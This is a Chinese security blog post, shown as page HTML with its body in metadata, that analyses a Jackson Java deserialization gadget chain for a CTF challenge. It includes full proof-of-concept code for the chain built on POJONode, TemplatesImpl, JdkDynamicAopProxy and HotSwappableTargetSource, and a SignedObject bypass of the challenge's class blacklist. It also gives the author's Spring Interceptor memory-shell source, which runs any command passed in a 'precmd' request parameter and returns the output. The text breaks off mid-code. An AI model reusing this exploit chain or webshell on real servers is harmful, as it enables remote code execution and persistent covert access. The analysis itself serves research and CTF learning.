<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>jackson原生链 | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="环境 jackson版本太老的话，POJONode中代码会不对 &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.12.1.GA&lt;/version&gt; &lt;/dependency&gt; 0x01 writeValueAsString 这里我们jackson 原生链，利用点">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="jackson原生链" />
<meta property="og:description" content="环境 jackson版本太老的话，POJONode中代码会不对 &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.12.1.GA&lt;/version&gt; &lt;/dependency&gt; 0x01 writeValueAsString 这里我们jackson 原生链，利用点" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-11-14T20:01:23+08:00" />
<meta property="article:modified_time" content="2024-11-14T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="jackson原生链"/>
<meta name="twitter:description" content="环境 jackson版本太老的话，POJONode中代码会不对 &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt; &lt;version&gt;2.15.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.12.1.GA&lt;/version&gt; &lt;/dependency&gt; 0x01 writeValueAsString 这里我们jackson 原生链，利用点"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "jackson原生链",
      "item": "https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "jackson原生链",
  "name": "jackson原生链",
  "description": "环境 jackson版本太老的话，POJONode中代码会不对 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-databind\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-annotations\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.12.1.GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 0x01 writeValueAsString 这里我们jackson 原生链，利用点",
  "keywords": [
    
  ],
  "articleBody": "环境 jackson版本太老的话，POJONode中代码会不对\ncom.fasterxml.jackson.core jackson-databind 2.15.0 com.fasterxml.jackson.core jackson-core 2.15.0 com.fasterxml.jackson.core jackson-annotations 2.15.0 javassist javassist 3.12.1.GA 0x01 writeValueAsString 这里我们jackson 原生链，利用点跟writeValueAsString()有关，他用来将java对象序列化成json字符串，序列化的时候会调用java对象的getter方法，所以我们这里看下序列化的时候是怎么调用getter方法的\n_accessorMethod = (Method) member.getMember(); 设置getter方法，调用栈\n\u003cinit\u003e:234, BeanPropertyWriter (com.fasterxml.jackson.databind.ser) buildWriter:229, PropertyBuilder (com.fasterxml.jackson.databind.ser) _constructWriter:791, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) findBeanProperties:583, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) constructBeanSerializer:368, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) findBeanSerializer:279, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) _createSerializer2:231, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) createSerializer:165, BeanSerializerFactory (com.fasterxml.jackson.databind.ser) _createUntypedSerializer:1385, SerializerProvider (com.fasterxml.jackson.databind) _createAndCacheUntypedSerializer:1336, SerializerProvider (com.fasterxml.jackson.databind) findValueSerializer:510, SerializerProvider (com.fasterxml.jackson.databind) findTypedValueSerializer:713, SerializerProvider (com.fasterxml.jackson.databind) serializeValue:308, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser) _configAndWriteValue:3893, ObjectMapper (com.fasterxml.jackson.databind) writeValueAsString:3207, ObjectMapper (com.fasterxml.jackson.databind) main:16, JSTest (jackson) final Object value = (_accessorMethod == null) ? _field.get(bean) : _accessorMethod.invoke(bean, (Object[]) null); getter方法反射调用，只调用无参方法\ngetJack:31, Person2 (jackson) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) serializeAsField:687, BeanPropertyWriter (com.fasterxml.jackson.databind.ser) serializeFields:719, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std) serialize:155, BeanSerializer (com.fasterxml.jackson.databind.ser) _serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser) serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser) _configAndWriteValue:3893, ObjectMapper (com.fasterxml.jackson.databind) writeValueAsString:3207, ObjectMapper (com.fasterxml.jackson.databind) main:16, JSTest (jackson) 对比下调用栈，大概流程就是\nwriteValueAsString()一直到=\u003eDefaultSerializerProvider#serializeValue\n这里findTypedValueSerializer()会先对Filed和Method（包含setter和getter），进行初始化\n在_serialize()反射调用这些Filed和Method（测试发现，有属性的getter方法和没有属性的getter方法都会被调用）\n调用的时候，在BeanSerializerBase#serializeFields会通过for需要根据前面初始化的prop调用serializeAsField，注意，这里jack也有自己prop尽管他没有属性，但是他有getter，前面赋值优先赋值给Method，所以他也有自己prop，最后调用getJack()\n作为Gadgets的一环，我们知道他的作用就是调用任意类getter方法嘛，无疑Gadgets后半段就是TemplatesImpl.getOutputProperties()\n0x02 POJONode POJONode的toString可以调用writeValueAsString()，且对象可控，我们怎么调用toString呢，这里不难想到利用CC5的BadAttributeValueExpException，那么Gadgets就完整啦\nInternalNodeMapper#nodeToString 0x03 Gadgets BadAttributeValueExpException.readObject POJONode.toString InternalNodeMapper#nodeToString writeValueAsString() TemplatesImpl.getOutputProperties() 问题1 writeReplace() 我们满心欢喜构造好poc后，发现序列化的时就退出程序了，常规反序列化这个地方会调用writeReplace()\nwriteReplace()这里和toString()可以起到一样的效果，后面会调用到writeValueAsBytes(),后续会提前调用getter方法，然后报错中断\n解决：\n自构一个BaseJsonNode将writeReplace()删除 //这里应该是跟Classload加载的问题有关，后面留个坑\n构造个一样路径的，然后就可以打成功啦\npackage jackson; import com.fasterxml.jackson.databind.node.POJONode; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; public class jackson { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); byte[] code = clazz.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\"_name\",\"111\"); setFiled(templates,\"_bytecodes\",new byte[][]{code}); setFiled(templates,\"_tfactory\",new TransformerFactoryImpl()); POJONode jsonNodes = new POJONode(templates); BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(111); setFiled(badAttributeValueExpException,\"val\",jsonNodes); FileOutputStream fos = new FileOutputStream(\"bin\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(badAttributeValueExpException); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } 网上说这个不稳定，本地试了10次都没问题，就先不看\n存档1 BaseJsonNode 为什么本地重写BaseJsonNode可以解决问题1\n0x04 不稳定 之前说一直没遇到hhh，后面打内存马的时候出现了好几次这个问题，所以来补下这个坑。因为这个是概率触发，所以不太好截图\n产生的原因呢是在jackson自己的序列化中，看到serializeFields()\n这里是for循环，props是之前赋值的，然后根据filed的名字调用去获取对应的值，这里后面就是调用对应的getter或者反射获取filed值了，问题就出在这个props值的顺序上，如果第一个值是outputProperties，最先调用的就是getOutputProperties()自然就可以调用成功。\n但是如果是其他值就会有问题，这里值分别是stylesheetDOM，transletIndex\n这两个值对应两个getter方法getStylesheetDOM(),getTransletIndex()\npublic DOM getStylesheetDOM() { return (DOM)_sdom.get(); } public synchronized int getTransletIndex() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _transletIndex; } 如果先getTransletIndex()再getOutputProperties()也没事，getTransletIndex()只是帮忙加载了字节码，不会照成影响。\n有问题只有一种场景，getStylesheetDOM在getOutputProperties前面调用\n这个时候会在恶意类实例化前调用getStylesheetDOM()，而_sdom是null，会报空指针的错误\n那很简单呀我们给他赋予一个值不就行了，其实不能wwwww\n我们看到TemplatesImpl其实会给这个赋予一个ThreadLocal实例，那为什么是null呢\nprivate transient ThreadLocal _sdom = new ThreadLocal(); 这里是反序列化嘛，问题可能就出在这里\n可以看到TemplatesImpl这里是不会序列化_sdom这个值的，同时反序列化的地方也不会赋值这个filed，所以他是null\n解决 但是我们不难想到getOutputProperties是继承的Templates接口，他只有这一个getter呀，能不能换成他呢（这里试过类型转换，没用）\n解决办法是用到动态代理，然后代理Templates接口，使得props只有getOutputProperties这个方法，Proxy调用getOutputProperties(),触发代理调用invoke方法，如果这个代理类invoke方法可以设置我们的TemplatesImpl对象来调用getOutputProperties()问题就解决了\n这里需要补充点东西，我们知道序列化会调用getter，之前分析流程可能不够细\njackson的初始化，最初会在AnnotatedMethodCollector.java#_addMemberMethods，找到类所有方法并put\n这里是获取代理的方法，最终其实是通过反射getDeclaredMethods()获取的，但是其获取方法得到的顺序每次可能存在一些偏差，这也是jackson链子不稳定的原因\npublic static Method[] getClassMethods(Class\u003c?\u003e cls) { try { return cls.getDeclaredMethods(); } 一共是5个方法，分别是hashcode,equals,toString,getOutputProperties,newTransformer\n这里我们用java的反射 getDeclaredMethods 方法去获取代理类所有方法时也是根据我们提供的接口（这里是Templates.class）去获取的方法。，所以只有上面5个方法，其他3个方法自带的都会有，然后getter就只有getOutputProperties\nObject proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); 然后将获取的方法返回，这里会尝试添加到props里，只有getOutputProperties添加了\n然后后面其他的赋值就只有getOutputProperties这一个getter方法了\n0x05 JdkDynamicAopProxy org.springframework.aop.framework.JdkDynamicAopProxy需要aop依赖\n这个类有啥用呢，通过前面的处理可以只调用getOutputProperties()，调用后触发代理类invoke()方法，其中在invokeJoinpointUsingReflection()处会反射调用对应的方法（getOutputProperties）\n我这里缩减下代码，我们需要控制这里target，target来自targetSource，targetSource有来初始化设置的this.advised\nTargetSource targetSource = this.advised.targetSource; target = targetSource.getTarget(); 这里我们将TemplatesImpl进行AdvisedSupport封装放入对应的值，反射时就能调用到我们放入的TemplatesImpl对象\nClass\u003c?\u003e clazz = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\"); Constructor\u003c?\u003e cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); POJONode jsonNodes = new POJONode(proxyObj); 0x06 poc package jackson; import com.fasterxml.jackson.databind.node.POJONode; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.tomcat.util.codec.binary.Base64; import org.springframework.aop.framework.AdvisedSupport; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import javax.xml.transform.Transformer; import javax.xml.transform.TransformerConfigurationException; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.security.*; import java.util.Properties; public class jackson { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzs = pool.get(Evil.class.getName()); byte[] code = clazzs.toBytecode(); //System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\"_name\",\"111\"); setFiled(templates,\"_bytecodes\",new byte[][]{code}); setFiled(templates,\"_tfactory\",new TransformerFactoryImpl()); Class\u003c?\u003e clazz = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\"); Constructor\u003c?\u003e cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); POJONode jsonNodes = new POJONode(proxyObj); BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(111); setFiled(badAttributeValueExpException,\"val\",jsonNodes); // 生成私钥和公钥 KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(\"RSA\"); keyPairGen.initialize(2048); KeyPair keyPair = keyPairGen.generateKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); // 创建签名引擎 Signature signingEngine = Signature.getInstance(\"SHA256withRSA\"); signingEngine.initSign(privateKey); SignedObject signedObject = new SignedObject(badAttributeValueExpException,privateKey,signingEngine); POJONode node = new POJONode(signedObject); BadAttributeValueExpException bad=new BadAttributeValueExpException(111); setFiled(bad,\"val\",node); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(bad); oos.close(); byte[] serializedBytes = bos.toByteArray(); byte[] base64EncodedBytes = Base64.encodeBase64(serializedBytes); System.out.println(new String(base64EncodedBytes)); // 从文件中反序列化对象 String base64EncodedData = \"\"; byte[] decodedBytes = Base64.decodeBase64(base64EncodedData); // 反序列化 ByteArrayInputStream bis = new ByteArrayInputStream(serializedBytes); ObjectInputStream ois = new ObjectInputStream(bis); ois.readObject(); } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } 0x07 另一种触发tostring 除了用上面CC5来触发tostring方法还有其他链子，org.springframework.aop.target.HotSwappableTargetSource.java(HSTS)，这个类是spring aop模块的\n这里是看secobj这道和jackson相关的反序列化题接触到的，这里看到链子\nHashMap#readObject -\u003e HashMap#putVal -\u003e HotSwappableTargetSource#equals -\u003e XString#equals -\u003ePOJONode#toString 这个是前面的触发的利用连，我们简单分析下链子，我第一眼看这个链子就想为啥要HotSwappableTargetSource#equals这步，直接XString#equals不好么。我们开始分析\n一开始我就遇到了困难点，我是调用else中的key.equals(k)来触发后面的链子，但是我们进入else并不容易\n问题1 putVal tab 这里可以看到p是从tab中取值的，其中i还是通过and和hash运算，这里明显一次putVal方法不够，我们第一次给tab[i],第二次调用第一次的tab[i]\nHashmap#readObject 中也是for调用putVal，上面想法可以实现\nfor (int i = 0; i \u003c mappings; i++) { @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } mappings 通过putVal()中的代码，我们知道要进入else，第二次的i要和第一次的i一样，才能让\n(p = tab[i = (n - 1) \u0026 hash]) != null (这里是不等于，md格式的问题) 及两次的key的hash值要一样，也就是间接key要一样咯？，但是赋值直接put的话，只会有一对值，覆盖第一个value。而put也是调用的putVal()，会判断key的hash，一样的话并不会多加一对值。\npublic V put(K key, V value) { return putVal(hash(key), key, value, false, true); } 这里主要原因是这个hash值，所以我们第二值可以直接用这个putVal()来赋值，hash我们可以随便设置，因为readObject的时候，hash值还是去通过hash(key)去获取的，并不影响\nHashMap hashMap = new HashMap(); hashMap.put(hotSwappableTargetSource2,\"111\"); //hashMap.put(hotSwappableTargetSource,\"222\"); Method putVal = hashMap.getClass().getDeclaredMethod(\"putVal\", int.class, Object.class, Object.class, boolean.class, boolean.class); putVal.setAccessible(true); putVal.invoke(hashMap,123,hotSwappableTargetSource,\"222\",false,true); key hash的问题解决了，有个究极问题（两次的key不能相等）\n看到这里进入else之后的这个if判断，这里||如果前面为true了的话就不会执行后面的key.equals(k)方法进行判断了\nif (p.hash == hash \u0026\u0026 ((k = p.key) == key || (key != null \u0026\u0026 key.equals(k)))) Hashmap#hash\nstatic final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u003e\u003e\u003e 16); } 但是常规思路，这个是不可能的，因为hash值要一样意味着key一样，而这里却要key不相同！——！，除非他hashCode()有黑魔法嘿嘿\n这里也就是为什么要套一层HSTS的原因\nHSTS 我的神 这家伙hashCode方法完美解决的了这个问题，其返回的是一个固定值我去（不知道为什么这么设计，从逻辑上看其实算个缺陷，不符合逻辑呀hhh）\n@Override public int hashCode() { return HotSwappableTargetSource.class.hashCode(); } 所以这里key都用HotSwappableTargetSource\n后面就比较顺利了，没什么问题，这里注意下第一个XString要用String那个构造方法，因为str()里String转义可能报错中断\npoc 这里poc还夹杂着SignedObject(二次反序列化)和JdkDynamicAopProxy(稳定触发getOutputProperties)，spring内存马\n因为题目需要这些，然后相关代码和附件我也会放到poc下面\nimport com.fasterxml.jackson.databind.node.POJONode; import com.govuln.shiroattack.Evil; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xml.internal.utils.XMLString; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.ClassPool; import javassist.CtClass; import org.apache.tomcat.util.codec.binary.Base64; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.target.HotSwappableTargetSource; import javax.management.BadAttributeValueExpException; import javax.xml.transform.Templates; import javax.xml.transform.Transformer; import javax.xml.transform.TransformerConfigurationException; import java.io.*; import java.lang.reflect.*; import java.security.*; import java.util.HashMap; import java.util.Properties; public class jackson { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzs = pool.get(Interceptor_demo.class.getName()); byte[] code = clazzs.toBytecode(); //System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\"_name\",\"111\"); setFiled(templates,\"_bytecodes\",new byte[][]{code}); setFiled(templates,\"_tfactory\",new TransformerFactoryImpl()); Class\u003c?\u003e clazz = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\"); Constructor\u003c?\u003e cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); POJONode jsonNodes = new POJONode(proxyObj); BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(111); setFiled(badAttributeValueExpException,\"val\",jsonNodes); // 生成私钥和公钥 KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance(\"RSA\"); keyPairGen.initialize(2048); KeyPair keyPair = keyPairGen.generateKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); // 创建签名引擎 Signature signingEngine = Signature.getInstance(\"SHA256withRSA\"); signingEngine.initSign(privateKey); SignedObject signedObject = new SignedObject(badAttributeValueExpException,privateKey,signingEngine); POJONode node = new POJONode(signedObject); // BadAttributeValueExpException bad=new BadAttributeValueExpException(111); // setFiled(bad,\"val\",node); XString xString = new XString(\"123\"); Constructor\u003cXString\u003e Constructor = XString.class.getDeclaredConstructor(Object.class); Constructor.setAccessible(true); //XString xString = Constructor.newInstance(new XString(\"123\")); XString xString2 = Constructor.newInstance(node); HotSwappableTargetSource hotSwappableTargetSource = new HotSwappableTargetSource(xString); HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(node); HashMap hashMap = new HashMap(); hashMap.put(hotSwappableTargetSource2,\"111\"); //hashMap.put(hotSwappableTargetSource,\"222\"); Method putVal = hashMap.getClass().getDeclaredMethod(\"putVal\", int.class, Object.class, Object.class, boolean.class, boolean.class); putVal.setAccessible(true); putVal.invoke(hashMap,123,hotSwappableTargetSource,\"222\",false,true); // Field modCount = hashMap.getClass().getDeclaredField(\"size\"); // modCount.setAccessible(true); // modCount.set(hashMap,2); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(hashMap); oos.close(); byte[] serializedBytes = bos.toByteArray(); byte[] base64EncodedBytes = Base64.encodeBase64(serializedBytes); System.out.println(new String(base64EncodedBytes)); // 从文件中反序列化对象 String base64EncodedData = \"\"; byte[] decodedBytes = Base64.decodeBase64(base64EncodedData); // 反序列化 ByteArrayInputStream bis = new ByteArrayInputStream(serializedBytes); ObjectInputStream ois = new MyObjectInputStream(bis); ois.readObject(); } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } MyObjectInputStream\n这个是题目的过滤，可以看到过滤了CC5开头\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // import java.io.IOException; import java.io.InputStream; import java.io.InvalidClassException; import java.io.ObjectInputStream; import java.io.ObjectStreamClass; public class MyObjectInputStream extends ObjectInputStream { private static final String[] blackList = new String[]{\"AbstractTranslet\", \"Templates\", \"TemplatesImpl\", \"javax.management\", \"swing\", \"awt\", \"fastjson\"}; public MyObjectInputStream(InputStream in) throws IOException { super(in); } protected MyObjectInputStream() throws IOException, SecurityException { } protected Class\u003c?\u003e resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String[] var2 = blackList; int var3 = var2.length; for(int var4 = 0; var4 \u003c var3; ++var4) { String black = var2[var4]; if (desc.getName().contains(black)) { throw new InvalidClassException(\"Unauthorized deserialization attempt\", desc.getName()); } } return super.resolveClass(desc); } } Interceptor_demo\n这个是我自己写的spring的Interceptor内存马\nimport com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.aopalliance.intercept.Interceptor; import org.springframework.lang.Nullable; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.PrintWriter; import java.lang.reflect.Method; @RestController public class Interceptor_demo extends AbstractTranslet implements HandlerInterceptor,Interceptor { public Interceptor_demo() throws Exception { System.out.println(\"main\"); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); RequestMappingHandlerMapping bean = null; if (context != null) { bean = context.getBean(RequestMappingHandlerMapping.class); } bean.setInterceptors(new Interceptor[]{new Interceptor_demo(\"a\")}); Class\u003c?\u003e aClass2 = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMapping\"); Method initApplicationContext = aClass2.getDeclaredMethod(\"initApplicationContext\"); initApplicationContext.setAccessible(true); initApplicationContext.invoke(bean); System.out.println(\"1111111111111111111111\"); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public Interceptor_demo(String a) { } @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String precmd = request.getParameter(\"precmd\"); if (precmd!= null \u0026\u0026!precmd.isEmpty()) { try { Process process = Runtime.getRuntime().exec(precmd); InputStreamReader isr = new InputStreamReader(process.getInputStream()); BufferedReader br = new BufferedReader(isr); response.setContentType(\"text/plain\"); PrintWriter writer = response.getWriter(); String line; while ((line = br.readLine())!= null) { writer.write(line + \"\\n\"); } br.close(); isr.close(); } catch (IOException e) { response.setContentType(\"text/plain\"); PrintWriter writer = response.getWriter(); writer.write(\"执行命令时出现异常: \" + e.getMessage()); writer.close(); } } System.out.println(\"preprepreprepreprepre\"); // 这里可以进行权限验证等操作，如果验证不通过可以返回 false 中断请求处理 return true; } // public Interceptor_demo(String a) { // } public void postHandle(HttpServletRequest request, HttpServletResponse response, 